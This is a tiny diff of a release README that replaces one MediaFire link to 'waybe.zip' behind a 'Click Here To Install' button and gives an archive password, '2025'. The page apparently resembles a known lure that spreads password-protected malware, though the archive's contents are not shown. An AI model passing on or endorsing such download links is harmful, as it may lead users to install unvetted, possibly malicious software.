@@ -1,3 +1,3 @@
 # release
-[Click Here To Install](https://www.mediafire.com/file/5g57hnhx8eqzt53/waybe.zip/file)
+[Click Here To Install](https://www.mediafire.com/file/92wgqff8q35johw/waybe.zip/file)
 [Pass - 2025]
